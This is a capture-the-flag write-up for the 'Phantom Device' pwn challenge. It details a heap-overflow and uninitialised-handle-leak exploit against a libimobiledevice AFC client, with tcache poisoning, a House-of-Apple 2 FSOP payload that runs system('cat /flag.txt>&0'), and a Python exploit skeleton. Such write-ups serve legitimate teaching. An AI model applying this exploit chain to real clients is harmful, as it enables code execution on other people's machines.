# Best Technical Writeup — Phantom Device (9164)

*Best Technical Writeup submission — Team Dente, CSCTF 2026.*

**Category:** Pwn · **Challenge:** Phantom Device · **Flag:** `CSCTF{Ebbi6vq9Ol7k1PqPPR1vZNSG}`

Paths beginning `wave3/` refer to the team's working-note archive at `ctf-telecom/wave3/` (the challenge files, lane reports, and raw exploit outputs cited below).

## Abstract

Phantom Device is an AFC protocol impersonation challenge. We play a malicious iOS device against a vulnerable `libimobiledevice` client. The client trusts two 64-bit length fields in the AFC header, narrows them to 32 bits, allocates using one and receives using the other. That gives a linear heap overflow with a fully controlled length and contents.

The exploit is built from three primitives:

1. An **8-byte uninitialised file-handle leak** — `afc_file_open` copies 8 bytes from a 1-byte response — which leaks both a libc pointer and, with the right heap grooming, a safe-linked heap pointer.
2. **Two tcache-poisoning hops** that make `malloc` return `libc+0x2042f0` and `libc+0x2046f0`.
3. A **House-of-Apple 2 FSOP** payload written across those two hops into `_IO_2_1_stdin_`, so `exit()` calls `system("  cat /flag.txt>&0;echo __DONE__>&0")`.

The transport imposes a hard design constraint: the client does a single `recv(this_len)` per AFC packet, and on the live path a single receive delivers roughly one TCP segment — **≤ ~1100 bytes reliably**. A monolithic 4.8 KB libc `.data` image cannot land. The winning design is two just-in-time hops of **1024** and **960 bytes**.

The full chain was first validated locally (`FSOP_OK`, `CSCTF{lanec_local_marker_1234}`), then accepted live at 2026-11-08 04:37:37Z. The flag was read from the target socket and saved in `wave3/chal/9164/work/9164_flag.txt`.

## 1. The target

The instance runs:

```
socat TCP-LISTEN:1337,fork EXEC:handler.sh
```

`handler.sh` executes `/challenge/client` as user `ctf`. The client is a libimobiledevice AFC client: it connects to us, sends AFC requests, and expects AFC replies. We are the device.

The client binary and its libraries are provided in `wave3/chal/9164/files/`:

- `client` (the vulnerable AFC client),
- `libimobiledevice-1.0.so.6`,
- `libplist-2.0.so.3` / `.so.4`,
- `libusbmuxd-2.0.so.6`,
- `libc.so.6` (Ubuntu GLIBC 2.39-0ubuntu8.9).

The local harness uses the challenge's own loader and libraries (`work/libdir_ubuntu/`), so the heap layout and libc offsets match the target.

## 2. AFC on the wire

AFC packets are little-endian. The 40-byte header is:

| Offset | Size | Field |
|---|---|---|
| 0x00 | 8 | magic `CFA6LPAA` |
| 0x08 | 8 | `entire_length` (u64) |
| 0x10 | 8 | `this_length` (u64) |
| 0x18 | 8 | `packet_num` (u64) |
| 0x20 | 8 | `operation` (u64) |
| 0x28 | … | body |

The client's request sequence, measured live, is 14 requests:

| # | op | request | reply we send |
|---|---|---|---|
| R0 | 3 | `READ_DIR "/"` | empty DATA |
| R1 | 3 | `READ_DIR "/DCIM"` | 0x418-byte DATA (5 strings) |
| R2 | 11 | `GET_DEVINFO` | empty DATA |
| R3 | 10 | `GET_FILE_INFO "/etc/fstab"` | 0x100-byte DATA (3 strings) |
| R4 | 3 | `READ_DIR "/var"` | empty DATA |
| R5 | 13 | `FILE_OPEN "/etc/fstab"` mode 2 | 1-byte DATA `'A'` → libc leak |
| R6 | 15 | `READ_FILE` handle H1, size 0x1000 | empty DATA |
| R7 | 13 | `FILE_OPEN "/var/log/syslog"` | 1-byte DATA `'B'` → heap leak (client stalls ~30 s) |
| R8 | 15 | `READ_FILE` H2 | overflow reply (poisons 0x60 bin) |
| R9 | 13 | `FILE_OPEN "/var/log/auth.log"` | overflow reply (poisons 0x30 bin) |
| R10 | 15 | `READ_FILE` H3 | 0x58-byte DATA (pop 0x60 head) |
| R11 | 20 | `FILE_CLOSE` H1 | 1024-byte hop 1 |
| R12 | 20 | `FILE_CLOSE` H3 | 0x28-byte DATA (pop 0x30 head) |
| R13 | 20 | `FILE_CLOSE` H2 | 960-byte hop 2 |

Replies use operation 1 (`STATUS`) with an 8-byte error code, or operation 2 (`DATA`) with a body. `packet_num` is strict: a mismatched counter returns `AFC_E_OP_HEADER_INVALID` and desynchronises the stream, so every reply echoes the client's expected counter (`reply(..., r[2], ...)` in `solve10.py`).

## 3. The bug: `entire_length` versus `this_length`

`afc_receive_data()` in `afc.c` (`wave3/chal/9164/work/vendor/afc.c`, lines 265-280; unrelated checks elided):

```c
entire_len = (uint32_t)header.entire_length - sizeof(AFCPacket);   // malloc size
this_len   = (uint32_t)header.this_length   - sizeof(AFCPacket);   // recv size

dump_here = (char*)malloc(entire_len);
if (this_len > 0) {
    service_receive(client->parent, dump_here, this_len, bytes_recv);
    if (*bytes_recv <= 0) { ... }
    else if (*bytes_recv < this_len) { ... }
}
```

Two things are wrong:

1. **The 64-bit fields are narrowed to `uint32_t` before the subtraction.** A length above 4 GiB wraps. That narrowing is a bug in itself, although the exploit does not need a 4 GiB value.
2. **There is no `this_len <= entire_len` check.** `malloc(entire_len)` can allocate a small chunk, and the following `recv` can write `this_len` bytes — a linear heap overflow with attacker-controlled length and bytes.

`service_receive()` is not a read-until-full helper. It calls `idevice_connection_receive_timeout()` → `socket_receive_timeout()`, which does `select()` and **one `recv(fd, data, length, 0)`** (`work/vendor/socket.c:800`). That single-receive behaviour is the central constraint of the live exploit (§9).

The practical trigger is:

```
entire_length = 0x28 + small     -> malloc(small)
this_length   = 0x28 + large     -> recv(large)
```

For example, `entire_length = 0x28` allocates an 8-byte buffer (a 0x20 chunk), and `this_length = 0x528` writes 0x500 bytes past it. We verified this live: a 0x500-byte body on a 0x20 allocation kills the client immediately; a 20-byte body survives (`LANE-B.md` §Stage 1).

There is a second, less useful path: when `entire_len > this_len`, the code loops `recv` until `entire_len`. That is a "loop write" bounded by the allocation size, so it only works for `entire_len ≤ 0x410` (tcache-sized) and a size-matching target chunk (`LANE-D.md` §3). We use the overflow direction instead.

## 4. Leak 1: the 8-byte uninitialised file handle

`afc_file_open()` receives the device's reply into `data`, then:

```c
ret = afc_receive_data(client, &data, &bytes);
if ((ret == AFC_E_SUCCESS) && (bytes > 0) && data) {
    memcpy(handle, data, sizeof(uint64_t));   // reads 8 bytes
    free(data);
    return ret;
}
```

It checks `bytes > 0`, not `bytes >= 8`. If we reply with `DATA` and a **1-byte body**, `data` points at a 1-byte allocation and `memcpy` reads 7 bytes of stale heap metadata. The client stores the resulting 8-byte handle and sends it back in the next `READ_FILE` request — a perfect leak channel, because stdout is not ours but the request body is.

Live evidence (`LANE-B.md` §Stage 2):

```
op=15 pn=7 payload=b'A_\xc9~\x14t\x00\x00\x00\x10\x00\x00...'
handle = 0x74147ec95f41
```

The `0x41` is our `'A'`; the next seven bytes are a libc pointer. The same primitive also leaks a heap pointer when the relevant tcache bin has at least two entries: the 7 stale bytes are then the safe-linked `fd` of the next chunk. The winning R7 uses a 0x58-byte allocation (0x60 bin); `LANE-B.md` §Stage 3 documents the 0x20-bin variant.

This is the CVE-2026-116261 primitive described in the public AFC writeup, and it is the only leak we need.

## 5. Leak 2: libc base

For the libc leak, the `malloc(1)` for the `FILE_OPEN` reply is carved from a freed unsorted/large-bin chunk. Its first 8 bytes are a `main_arena` bin pointer. The handle's low byte is our `'A'`; the real pointer's low byte is `0x20`, so:

```python
libc = ((h & ~0xff) | 0x20) - 0x204b20
```

The result must satisfy `libc & 0xfff == 0` and `libc >> 48 == 0`; the exploit checks both and aborts otherwise. On the live instance the formula produced the same libc base on every run of a container (`LANE-D.md` §1). The offset `0x204b20` is the leaked arena-bin address for this exact libc (GLIBC 2.39-0ubuntu8.9).

## 6. Leak 3: heap page and safe-linking

glibc 2.32+ protects tcache `fd` pointers with safe-linking:

```
stored_fd = (chunk_user_address >> 12) ^ next_pointer
```

To make `malloc` return an arbitrary target, we must write:

```
stored_fd = (chunk_user_address >> 12) ^ target
```

The heap leak gives us the high bits of the heap. The 1-byte body in the R7 `FILE_OPEN` reply makes the handle equal to a safe-linked `fd` with its low byte clobbered by `'B'`. With two entries in the same 0x60 bin, the head and next chunks are 0x60 apart and — in the measured layout — on the same 4 KB page, so:

```
y = handle >> 12 = P ^ (P >> 12)
```

where `P` is the heap page (`chunk_user >> 12`). The handle's low byte is ours, and the shift discards the low 12 bits; the solver recovers `P` from the high bits. It iterates the 12-bit seed and reconstructs the page bit by bit:

```python
def solve_heap_page(fd_leak):
    y = fd_leak >> 12
    for seed in range(1 << 12):
        P = seed
        for i in range(40):
            P |= (((y >> i) & 1) ^ ((P >> i) & 1)) << (i + 12)
        if (P ^ (P >> 12)) == y and 0x5000_0000_0000 <= (P << 12) < 0x8000_0000_0000:
            return P << 12
```

It returns exactly one page-aligned heap base per run, verified against `/proc/<pid>/maps` and `/proc/<pid>/mem` locally and against the live handle (`LANE-B.md` §Stage 3, `LANE-D.md` §1). For example, the local handle `0x55500b8f5441` solves to the page `P = 0x55555edab` (heap base `0x55555edab000`), matching the `/proc` trace. The same encoded-pointer formula is then used in both poison writes.

## 7. Heap choreography

The layout is built by R1's `READ_DIR` body and R3's `FILE_INFO` parse; R5 and R7 then leak the addresses. The named offsets are:

| Symbol | Offset | What it is |
|---|---|---|
| `P_X` | `0x17c0` | heap: R3 reply buffer, 0x110 chunk (0x110 bin head) |
| `P_LIST` | `0x18d0` | heap: R3 parse array, 0x30 chunk (0x30 bin head) |
| `P_R1ARR` | `0x1be0` | heap: R1 parse array, 0x40 chunk (0x40 bin head) |
| `P_STR5` | `0x1da0` | heap: 0x60 bin head (last `READ_DIR` string) |
| `OFF_ARENA_BIN0` | `0x204b20` | libc: arena-bin address leaked by `open#1` |

The measured sequence (`LANE-E.md` §2):

1. **R1** `READ_DIR "/DCIM"` returns a 0x418-byte body with five NUL-separated strings. The parser allocates five 0x60-bin strings and a 0x40-bin array.
2. **R3** `GET_FILE_INFO` returns 0x100 bytes with three short strings. The parser carves `X` (0x110) out of the large chunk and allocates a 0x30-bin array plus 0x30-bin strings.
3. **R5** `FILE_OPEN` returns one byte `'A'` → libc leak.
4. **R7** `FILE_OPEN` returns one byte `'B'` → heap leak. The reply declares `entire_len=0x58` but sends `this_len=1`, so the client's `entire_len > this_len` loop waits for the missing bytes and times out after ~30 s. That timeout is our clean scheduling point for the remaining replies.
5. **R8** `READ_FILE` overflows from the 0x40-bin R1 array into the 0x60-bin head (`P_STR5`), poisoning its `fd`.
6. **R9** `FILE_OPEN "/var/log/auth.log"` overflows from `X` (0x110) into the 0x30-bin `P_LIST`, poisoning its `fd`.
7. **R10** `READ_FILE` pops the 0x60 head and frees it into the 0x40 bin, leaving the 0x60 bin head = target 1.
8. **R11** `FILE_CLOSE H1` mallocs the 0x60-bin target and writes 1024 bytes (hop 1).
9. **R12** `FILE_CLOSE H3` pops the 0x30 head and frees it, leaving the 0x30 bin head = target 2.
10. **R13** `FILE_CLOSE H2` mallocs the 0x30-bin target and writes 960 bytes (hop 2).

The heap offsets are stable across ASLR because they are relative to the `[heap]` base. The `R3` layout was re-measured with `/proc/<pid>/mem` dumps on the local run; the live run uses the same offsets (`LANE-E.md` §2).

## 8. Two-hop tcache poisoning

### Why two hops

The local exploit's first design wrote a single faithful libc `.data` image starting at `libc+0x2041f0`, length `0x15b0` (5552 bytes), covering `_IO_2_1_stderr_` at `libc+0x2054e0` and `_IO_2_1_stdout_` at `libc+0x2055c0`. A later live design shrank this to a 4816-byte image at `libc+0x2042f0` (`LANE-D.md` §2). Both are one-shot images. Both work on loopback, where the whole body is buffered. Neither can work on the live socket: `service_receive` does one `recv(this_len)`, and the live path delivers only about one TCP segment per receive. The measured ceiling is discussed in §9.

The live target for hop 1 is `libc+0x2042f0`; hop 2 starts at `libc+0x2046f0` and ends at `libc+0x204ab0`. That is enough to rebuild `_IO_2_1_stdin_` at `libc+0x2048e0` (offset `0x1f0` into hop 2). It is not enough to reach stderr (`0x2054e0`) or stdout (`0x2055c0`), which need more than 1.5 KB of reach. `stdin` is the last FILE in the `_IO_list_all` chain and the only chain member a 960-byte write can rebuild (`LANE-E.md` §6).

### Poison 1: 0x60 bin → `libc+0x2042f0`

R8's reply allocates `0x38` bytes (a 0x40 chunk) for `READ_FILE`, with `this_len` larger than `entire_len`. The overflow starts at the R1 array and reaches the 0x60-bin head:

```python
src = P_R1ARR + 0x10
o = (P_STR5 + 0x10) - src
b = bytearray(b'Z' * (o + 8))
struct.pack_into('<Q', b, o - 0x10, 0)       # prev_size
struct.pack_into('<Q', b, o - 8, 0x41)       # size -> free goes to 0x40 bin
struct.pack_into('<Q', b, o, target1 ^ ((heap + P_STR5 + 0x10) >> 12))
```

The forged size `0x41` is important. After R10 pops the 0x60 head, the client frees it. The `free()` reads the size at `chunk-8`; `0x41` routes the chunk to the 0x40 bin instead of back to the 0x60 bin, so the next 0x60 allocation returns the poisoned target rather than the same chunk.

### Poison 2: 0x30 bin → `libc+0x2046f0`

R9's reply overflows from `X` into the 0x30-bin `P_LIST`:

```python
ov = overflow_body(
    fd=((heap + P_LIST + 0x10) >> 12) ^ target2,
    size_list=0x41,
)
```

`overflow_body` writes the forged `prev_size` / `size=0x41` / encoded `fd` at the right offsets (`solve2.py:183`). R12 pops the 0x30 head and frees it; the forged size sends it to the 0x40 bin, leaving the 0x30 bin head = target 2.

Each poisoned bin needs at least two live entries. If the bin count reaches zero, `tcache_get` returns `NULL` and the poison is skipped — that is exactly why the earlier `solve3.py` variant failed and `solve4.py`/`solve10.py` keep two entries (`LANE-D.md` §5).

### The two writes

The reply's `ent` is the malloc size and `thi` is the receive size (the code adds the 40-byte header):

```python
# R11: close#1
reply(conn, r[2], 2, img1, 0x58, 1024)   # malloc(0x58) -> 0x60 bin, recv 1024

# R13: close#3
reply(conn, r[2], 2, img2, 0x28, 960)    # malloc(0x28) -> 0x30 bin, recv 960
```

- `img1` is 1024 bytes: a faithful relocated libc `.data` image for `[0x2042f0, 0x2046f0)`. Its last 8 bytes at `0x2046e8` forge the next chunk's size `0x41`, so hop 2's chunk frees cleanly.
- `img2` is 960 bytes: a faithful `.data` image for `[0x2046f0, 0x204ab0)` plus the fake `_IO_2_1_stdin_` FILE, its wide data, and its wide vtable.

The images are built by `exploit_local.libc_image()`, which returns the libc bytes for the range plus the `.rela.dyn` and `DT_RELR` relocation lists; `solve10.build_image()` applies both. The RELR step is not optional: this Ubuntu libc is built with `-z pack-relative-relocs`, and a naive `.rela.dyn`-only replay leaves `__exit_funcs` at its link-time value (`0x205fc0` instead of `libc+0x205fc0`). `exit()` then crashes in `__run_exit_handlers` at `libc+0x47968` before `_IO_cleanup` ever runs (`LANE-C.md` §Blocker 2).

The chunk headers also have to be valid. The `free(target1)` after the 1024-byte write reads a size at `0x2042e8`, which is inside `mp_` and is `0x40` in the running libc; the free goes to the 0x40 tcache bin and only touches the front of the image. The `free(target2)` after the 960-byte write reads the forged `0x41` at `0x2046e8` (`LANE-C.md`, `LANE-E.md` §3).

## 9. The single-receive ceiling

This is the part that decides the exploit's shape.

`service_receive` → `socket_receive_timeout` does:

```c
res = socket_check_fd(fd, FDM_READ, timeout);
if (res <= 0) return res;
result = recv(fd, data, length, flags);   // one receive
```

It returns as soon as **one segment** has arrived; the rest of a multi-segment body stays in flight. The live measurement used `big.py`, with `entire=1` (a 1-byte allocation), `this_len=N`, and a body of `N` bytes; the handle echo in the next request tells us whether the full body landed:

| `N` | Result |
|---|---|
| 256 / 512 / 1024 / 1064 | full (handle echo intact) |
| 1200 / 1400 / 2048 / 4096 / 4816 | short (handle `0x2`, body never fully landed) |

So a single `recv` on the live path reliably delivers **≤ ~1100 bytes**. The boundary is one TCP segment (head+body ≤ MSS ≈ 1.3–1.4 KB); results jitter right at the boundary, which is why we design to 1024/960 rather than 1100. A separate scan measured 1024 and 1150 full, 1200/1280/1400 short, and 1340 full — the same MSS boundary with jitter (`LANE-D.md` §3). The conservative operating point is what matters.

Bandwidth is not the limit. The RTT to the box was ~26 ms; a 5416-byte burst was delivered ~6 ms after the 40-byte reply (~7 Mbit/s). Segmentation is the limit.

Two consequences:

1. **A 4816-byte one-shot image cannot land.** `LANE-D.md` correctly measured this and correctly listed the ways forward, but its headline — "the chain cannot fire on the live instance" — was wrong. The correct statement is "the one-shot image cannot land."
2. **Pipelining the remaining replies does not help; it breaks the writes.** Sending pop1/hop1/pop2/hop2 in one 2272-byte `sendall` produced a clean close for the `TEST_H2` crasher, while sending each reply just in time produced a core dump. Pre-buffered bodies are not equivalent to a reply sent after the request. The winning mode is `NOPIPE=1`: read the request, then send the reply.

The crasher variants are the independent proof that the hops landed:

- `TEST_H2` sets `_IO_2_1_stdin_._lock = 0x4141414141414141`. If the hop-2 write lands, `_IO_flush_all` must SIGSEGV. Just-in-time → core dump; pipelined → clean close.
- `TEST_H3` sets the fake wide vtable's `__doallocate = 0x4141414141414141`. Just-in-time → core dump, proving `_IO_wdoallocbuf` really calls `*(wide_vtable->__doallocate)(fp)`.
- `TEST_H1` / `TEST_H1B` similarly make `exit()` crash if the hop-1 write lands.

## 10. House of Apple 2 in `_IO_2_1_stdin_`

At `exit()`:

```
exit -> __run_exit_handlers -> _IO_cleanup -> _IO_flush_all_lockp
```

`_IO_flush_all_lockp` walks `_IO_list_all`: stderr → stdout → stdin. We leave the real stderr and stdout alone and rebuild the last chain member, `_IO_2_1_stdin_` at `libc+0x2048e0`. The fake FILE is at offset `0x1f0` inside hop 2 (`0x2048e0 - 0x2046f0`).

The fake FILE fields:

| Field | Offset | Value |
|---|---|---|
| `_flags` / command bytes | +0x00 | `"  cat /flag.txt>&0;echo __DONE__>&0"` (starts with two spaces) |
| `_chain` | +0x68 | `0` (ends the `_IO_flush_all` walk) |
| `_vtable_offset` | +0x80 | `0` |
| `_lock` | +0x88 | `libc+0x204a88` (inside hop 2) |
| `_wide_data` | +0xa0 | `libc+0x2049c0` |
| `_mode` | +0xc0 | `1` |
| `vtable` | +0xd8 | `libc+0x203228` (`_IO_wfile_jumps`) |
| wide `_IO_write_base` | WD+0x18 | `0` |
| wide `_IO_write_ptr` | WD+0x20 | `1` |
| wide `_IO_buf_base` | WD+0x30 | `0` |
| `_wide_vtable` | WD+0xe0 | `libc+0x204a10` |
| `__doallocate` | VT+0x68 | `libc+0x58750` (`system`) |

The wide data is at `libc+0x2049c0`; the wide vtable is at `libc+0x204a10`; `system` is written at `libc+0x204a10+0x68 = libc+0x204a78`. All three are inside hop 2.

Why it fires:

```
_IO_flush_all_lockp:
    fp->_mode (1) > 0
    && fp->_wide_data->_IO_write_ptr (1) > _IO_write_base (0)
    -> _IO_OVERFLOW(fp, EOF)
    -> _IO_wfile_overflow
    -> _IO_wdoallocbuf          (wide _IO_buf_base == 0, no _IO_UNBUFFERED)
    -> _IO_WDOALLOCATE(fp)
    -> *(fp->_wide_data->_wide_vtable + 0x68)(fp)
    -> system(fp)
```

`fp` is the FILE pointer, and the first bytes of the FILE are the command string. `system` ignores the leading spaces. This is the House-of-Apple 2 variant: the wide vtable is attacker-controlled and glibc 2.39 does not validate it before the `__doallocate` call.

The `_flags` value is not arbitrary. The first byte is `0x20`, so `_IO_NO_WRITES` (0x8), `_IO_UNBUFFERED` (0x2), and `_IO_USER_LOCK` (0x8000) are clear. `_IO_UNBUFFERED` clear is what lets `_IO_wdoallocbuf` reach `_IO_WDOALLOCATE`; `_IO_USER_LOCK` clear is what lets `_IO_flush_all` take the lock path; `_lock` must therefore point at a valid zeroed lock.

### Why stdin, not stderr or stdout

The local 5.5 KB image targets `_IO_2_1_stderr_` at `0x2054e0` and also has to repair `_IO_2_1_stdout_` at `0x2055c0`, because the image zeroes it and `puts("EXIT")` would otherwise die in `_IO_file_doallocate` when it tries to `malloc(BUFSIZ)` from the trashed arena. The local fix gives stdout its existing 0x1000 buffer at `heap+0x2a0` and sets `write_end > write_ptr`, so `puts` goes through `new_do_write` and resets the wide-data fields to the 0/1 the FSOP needs (`LANE-C.md` §Blocker 1).

On the live path, that entire design is out of reach. Hop 2 starts at `0x2046f0` and ends at `0x204ab0`; stderr and stdout are `0xdf0` and `0xed0` bytes beyond the hop start (`0xa30` and `0xb10` beyond its end). `stdin` at `0x2048e0` is the only chain member within 960 bytes. Targeting it also avoids the stdout-repair problem entirely: the real stdout is untouched and `puts("EXIT")` is safe.

## 11. Why the command writes to fd 0

The local exploit writes to fd 2 because the local harness gives the client a stderr pipe. The live transport does not behave the same way. The lane proved this with a sleep test:

```
system("sleep 5; ...")   -> socket close delayed by 5.03 s
system("echo AAA>&2")    -> nothing on the wire
system("echo AAA>&1")    -> nothing on the wire
system("echo AAA>&0")    -> AAA
system("cat /flag.txt>&0") -> the flag
```

So the shell runs, but the only usable bidirectional channel back to the driver is **fd 0**, the AFC socket. The final command is:

```
"  cat /flag.txt>&0;echo __DONE__>&0"
```

This was the last gotcha. Earlier `>&2` variants failed for this reason alone, not because the FSOP was wrong (`LANE-E.md` §4). The `__DONE__` marker lets the driver know the command completed even if the flag read is empty.

## 12. Exploit skeleton

The full driver is `wave3/chal/9164/work/solve10.py` (369 lines). The core loop:

```python
MAGIC = b'CFA6LPAA'
U1, L1 = 0x2042f0, 0x400          # hop 1 target / length
U2, L2 = U1 + L1, 0x3c0           # 0x2046f0 / 960
P_X, P_LIST = 0x17c0, 0x18d0
P_R1ARR, P_STR5 = 0x1be0, 0x1da0
cmd = 'cat /flag.txt>&0;echo __DONE__>&0'

def read_request(s):
    hdr = recvn(s, 40)
    ent, thi, pn, op = struct.unpack('<QQQQ', hdr[8:40])
    return ent, thi, pn, op, (recvn(s, thi - 40) if thi > 40 else b'')

def reply(s, pn, op, body, ent, thi):
    s.sendall(MAGIC + struct.pack('<QQQQ', ent + 40, thi + 40, pn, op) + body)

# R0-R4: build the heap
reply(conn, r[2], 2, b'', 0, 0)
big = big_body()                         # 0x418: five 0x60-bin strings
reply(conn, r[2], 2, big, len(big), len(big))
reply(conn, r[2], 2, b'', 0, 0)
pb = parse_body()                        # 0x100: X + 0x30-bin list/strings
reply(conn, r[2], 2, pb, len(pb), len(pb))
reply(conn, r[2], 2, b'', 0, 0)

# R5: libc leak
reply(conn, r[2], 2, b'A', 1, 1)
r = read_request(conn)
libc = ((struct.unpack('<Q', r[4][:8])[0] & ~0xff) | 0x20) - 0x204b20

# R7: heap leak (client stalls ~30 s)
reply(conn, r[2], 2, b'B', 0x58, 1)
r = read_request(conn)
heap = solve_heap(struct.unpack('<Q', r[4][:8])[0])

# R8: poison 0x60 bin -> libc+0x2042f0
src = P_R1ARR + 0x10
o = (P_STR5 + 0x10) - src
b = bytearray(b'Z' * (o + 8))
struct.pack_into('<Q', b, o - 0x10, 0)
struct.pack_into('<Q', b, o - 8, 0x41)
struct.pack_into('<Q', b, o, (libc + U1) ^ ((heap + P_STR5 + 0x10) >> 12))
reply(conn, r[2], 2, bytes(b), 0x38, len(b))

# R9: poison 0x30 bin -> libc+0x2046f0
ov = overflow_body(fd=((heap + P_LIST + 0x10) >> 12) ^ (libc + U2),
                   size_list=0x41)
reply(conn, r[2], 2, ov, 0x100, len(ov))

# R10-R13: pop, hop 1, pop, hop 2, just in time
for i, (ent, body) in enumerate([
    (0x58, b'P' * 0x58),
    (0x58, hop1_image(libc)),        # 1024 bytes
    (0x28, b'Q' * 0x28),
    (0x28, hop2_image(libc, cmd)),   # 960 bytes
]):
    r = read_request(conn)
    reply(conn, r[2], 2, body, ent, len(body))
```

The `ent` argument is the malloc size; the code adds 40 for the header. `ent=0x58` rounds to a 0x60 chunk, `ent=0x28` to a 0x30 chunk, and `ent=0x38` / `0x100` to the 0x40 / 0x110 chunks used for the two overflows. The skeleton omits the `r = read_request(conn)` call before each reply for brevity; every `reply` uses the packet number from the request it answers.

`hop1_image()` and `hop2_image()` are built from `exploit_local.libc_image()` and patched with the fake FILE fields in §10. `hop2_image()` takes the command string and asserts it is shorter than 0x60 bytes.

## 13. Results

| Item | Value |
|---|---|
| Local end-to-end | `FSOP_OK`; `CSCTF{lanec_local_marker_1234}` through `_IO_flush_all -> system()` |
| Live receive ceiling | ≤ ~1100 B reliable (1024/1064 full; 1200+ short, with MSS-boundary jitter at 1340) |
| Hop 1 | 1024 B at `libc+0x2042f0` |
| Hop 2 | 960 B at `libc+0x2046f0` |
| Fake FILE | `_IO_2_1_stdin_` at `libc+0x2048e0` |
| `_wide_vtable` / `__doallocate` | `libc+0x204a10`, `+0x68` = `libc+0x58750` (`system`) |
| Command | `"  cat /flag.txt>&0;echo __DONE__>&0"` |
| Live flag | `CSCTF{Ebbi6vq9Ol7k1PqPPR1vZNSG}` |
| Submission | `wave3/attempts.jsonl`, status `correct`, 2026-11-08 04:37:37Z |
| Flag file | `wave3/chal/9164/work/9164_flag.txt` (2026-11-08 04:36Z) |

The winning invocation:

```
NOPIPE=1 python3 solve10.py remote <host> <port> -v --cmd 'cat /flag.txt>&0;echo __DONE__>&0'
```

Local reproduction uses `exploit_local.py` with the local harness and `--cmd 'cat /tmp/flag9164.txt >&2; echo __DONE__ >&2'` (`/tmp/flag9164.txt` stands in for `/flag.txt`); the local marker is not the challenge flag. The live read is the only result that counts.

## 14. What made the exploit work

1. **The leak is in the protocol, not in a side channel.** The client's own `READ_FILE` request carries the handle back to us. We do not need stdout.
2. **Safe-linking is not a wall if you can leak the heap page.** The 1-byte `FILE_OPEN` reply gives an encoded `fd`; the 12-bit recurrence recovers the page. Once the page is known, `target ^ (chunk >> 12)` is exact.
3. **The tcache bin class decides where, the receive length decides how much.** `malloc(entire_len)` selects the poisoned bin; `recv(this_len)` writes as many bytes as we send, up to the transport ceiling. That separation is what makes a 1024-byte write to an arbitrary libc address possible.
4. **A local win is a hypothesis; the wire is the experiment.** The 5.5 KB stderr image and the fd-2 command worked locally; the live target needed two hops, just-in-time replies, and fd 0. The live exploit is the local chain plus three transport corrections.
5. **Crasher variants are verification.** A wild `_lock` and a wild `__doallocate` turn "the write probably landed" into a SIGSEGV we can attribute to a specific field.

## 15. Evidence index

| Path | Contents |
|---|---|
| `wave3/chal/9164/INTEL.md` | Challenge model, root cause, protocol notes |
| `wave3/chal/9164/work/LANE-B.md` | Live protocol, overflow proof, libc/heap leaks, safe-linking solver |
| `wave3/chal/9164/work/LANE-C.md` | Local FSOP proof, gdb trace, byte offsets, RELR/stdout blockers |
| `wave3/chal/9164/work/LANE-D.md` | Single-recv measurement, the incorrect "cannot fire" conclusion, ways forward |
| `wave3/chal/9164/work/LANE-E.md` | Two-hop live win, heap table, fd-0 proof, flag |
| `wave3/chal/9164/work/solve10.py` | Winning exploit (local/remote, `NOPIPE=1`) |
| `wave3/chal/9164/work/exploit_local.py` | Local chain, `libc_image()` RELA/RELR builder, fake stderr image |
| `wave3/chal/9164/work/solve2.py` | `big_body`, `parse_body`, `overflow_body`, `solve_heap_page` |
| `wave3/chal/9164/work/big.py` | Single-recv delivery probe |
| `wave3/chal/9164/work/9164_flag.txt` | `CSCTF{Ebbi6vq9Ol7k1PqPPR1vZNSG}` |
| `wave3/attempts.jsonl` | 9164 submission status `correct`, 2026-11-08 04:37:37Z |
| `wave3/chal/9164/work/vendor/afc.c` | Vulnerable `afc_receive_data` / `afc_file_open` source |
| `wave3/chal/9164/work/vendor/socket.c` | `socket_receive_timeout`: `select()` + one `recv()` |

## 16. Limitations

- The instance was ephemeral. The host/port in `LANE-B.md` / `LANE-E.md` are dead; the exploit needs a fresh assigned instance with the same challenge image.
- The libc offsets are exact for GLIBC 2.39-0ubuntu8.9. A different libc build changes `_IO_2_1_stdin_`, `_IO_wfile_jumps`, `system`, and the arena-bin offset; the heap choreography would also need re-measurement.
- The local marker `CSCTF{lanec_local_marker_1234}` is a test string, not the challenge flag. Only `9164_flag.txt` is the live result.
- The flag is per-team and was valid on the assigned instance; do not replay it against a different team's container.

## Files

The full evidence pack for this challenge — solve scripts, the derivation audit, lane reports,
the accepted flag record and the handouts used for local reproduction — is in
[`files/phantom-device/`](files/phantom-device/), with the submission record in
[`FLAG.md`](files/phantom-device/FLAG.md).
